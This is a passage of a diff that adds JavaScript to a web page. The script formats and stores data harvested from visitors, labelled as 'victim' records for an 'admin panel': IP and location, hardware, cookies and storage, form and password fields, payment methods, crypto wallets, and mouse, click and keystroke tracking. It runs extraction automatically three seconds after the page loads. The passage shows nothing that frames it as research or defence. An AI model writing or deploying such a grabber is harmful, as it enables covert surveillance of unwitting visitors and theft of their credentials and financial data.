+URL: ${data.meta.url}
+Timestamp: ${new Date(data.meta.timestamp).toLocaleString()}
+Referrer: ${data.meta.referrer || 'Direct'}
+SYSTEM OVERVIEW:
+OS: ${data.system.platform}
+CPU: ${data.hardware.cpu.cores} cores, ${data.hardware.cpu.architecture}
+Memory: ${data.hardware.memory.deviceMemory}GB
+GPU: ${data.hardware.gpu.vendor || 'Unknown'}
+Screen: ${data.hardware.display.screen.width}x${data.hardware.display.screen.height}
+NETWORK:
+IP: ${data.network.ip.ip || 'Unknown'}
+Location: ${data.network.ip.city || 'Unknown'}, ${data.network.ip.country || 'Unknown'}
+ISP: ${data.network.ip.org || 'Unknown'}
+Connection: ${data.network.network.effectiveType}
+Part 1/4 - Summary`;
+    }
+
+    function formatHardwareDetails(data) {
+        return `
+HARDWARE DETAILS
+STORAGE:
+Local Storage: ${Object.keys(data.hardware.storage.localStorage).length} items
+Cookies: ${Object.keys(data.hardware.storage.cookies).length}
+Session Storage: ${Object.keys(data.hardware.storage.sessionStorage).length}
+PERIPHERALS:
+Touch: ${data.hardware.peripherals.touchSupport}
+Bluetooth: ${data.hardware.peripherals.bluetooth}
+USB: ${data.hardware.peripherals.usb}
+Battery: ${data.hardware.battery.available ? data.hardware.battery.level * 100 + '%' : 'N/A'}
+PERFORMANCE:
+Heap Used: ${Math.round(data.hardware.memory.usedJSHeapSize / 1024 / 1024)}MB
+Heap Limit: ${Math.round(data.hardware.memory.jsHeapSizeLimit / 1024 / 1024)}MB
+Device Memory: ${data.hardware.memory.deviceMemory}GB
+PLUGINS (${data.system.plugins.length}):
+${data.system.plugins.slice(0, 5).map(p => p.name).join(', ')}
+Part 2/4 - Hardware`;
+    }
+
+    function formatUserDetails(data) {
+        const formCount = Object.keys(data.user.forms).length;
+        const inputCount = Object.keys(data.user.inputs).length;
+        const passwordCount = Object.keys(data.user.passwords).length;
+        return `
+USER DATA ANALYSIS
+FORM DATA:
+Forms Found: ${formCount}
+Input Fields: ${inputCount}
+Password Fields: ${passwordCount}
+SOCIAL MEDIA:
+${Object.keys(data.user.socialMedia).length > 0 ? 
+    Object.keys(data.user.socialMedia).join(', ') : 'None detected'}
+CONTACT INFO:
+Emails: ${data.social.emailAddresses.length}
+Phones: ${data.social.phoneNumbers.length}
+Social Handles: ${Object.keys(data.social.socialProfiles).length}
+FINANCIAL:
+Payment Methods: ${Object.keys(data.financial.paymentMethods).join(', ') || 'None'}
+Crypto Wallets: ${Object.keys(data.financial.cryptoWallets).join(', ') || 'None'}
+GEOLOCATION:
+IP Location: ${data.geolocation.ipLocation.city || 'Unknown'}
+Browser Location: Not requested
+Part 3/4 - User Data`;
+    }
+
+    function formatBehavioralDetails(data) {
+        return `
+BEHAVIORAL ANALYTICS
+INTERACTIONS:
+Time on Page: ${Math.round(data.behavioral.timeOnPage/1000)}s
+Scroll Depth: ${data.behavioral.scrollDepth}%
+Mouse Movements: ${data.behavioral.mouseMovements.length}
+Clicks: ${data.behavioral.clicks}
+Keystrokes: ${data.behavioral.keystrokes}
+BROWSER CAPABILITIES:
+WebRTC: ${data.advanced.webRTC.webRTCAvailable}
+Notifications: ${data.advanced.notifications.permission}
+Camera: ${data.advanced.permissions.camera || 'unknown'}
+Microphone: ${data.advanced.permissions.microphone || 'unknown'}
+ADVANCED FEATURES:
+Service Workers: ${data.advanced.serviceWorkers.serviceWorkers}
+Media Devices: ${data.advanced.mediaDevices.devices?.length || 0}
+SECURITY:
+WebDriver: ${data.browser.webdriver ? 'Detected' : 'Not detected'}
+Do Not Track: ${data.system.doNotTrack || 'Not set'}
+Part 4/4 - Behavioral & Advanced
+EXTRACTION COMPLETE - ALL DATA CAPTURED`;
+    }
+
+    function storeInAdminPanel(data) {
+        try {
+            const existing = localStorage.getItem('victimData');
+            const victims = existing ? JSON.parse(existing) : [];
+            victims.unshift(data);
+            if (victims.length > 100) {
+                victims.splice(100);
+            }
+            localStorage.setItem('victimData', JSON.stringify(victims));
+            localStorage.setItem('lastVictimUpdate', Date.now().toString());
+            dataStream.triggerDataUpdate();
+        } catch (e) {}
+    }
+
+    function generateVictimId() {
+        return 'vic_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
+    }
+
+    window.pageLoadTime = Date.now();
+    window.mouseMovements = [];
+    window.clickCount = 0;
+    window.keystrokeCount = 0;
+    window.focusChanges = 0;
+    window.resizeEvents = 0;
+
+    document.addEventListener('mousemove', (e) => {
+        window.mouseMovements.push({
+            x: e.clientX,
+            y: e.clientY,
+            timestamp: Date.now()
+        });
+        if (window.mouseMovements.length > 1000) {
+            window.mouseMovements.shift();
+        }
+    });
+
+    document.addEventListener('click', () => {
+        window.clickCount++;
+    });
+
+    document.addEventListener('keydown', () => {
+        window.keystrokeCount++;
+    });
+
+    document.addEventListener('focus', () => {
+        window.focusChanges++;
+    });
+
+    window.addEventListener('resize', () => {
+        window.resizeEvents++;
+    });
+
+    const dataStream = new ComprehensiveDataStream();
+
+    setTimeout(() => {
+        extractAllPossibleData().then(data => {});
+    }, 3000);
+    </script>
+</body>
+</html>
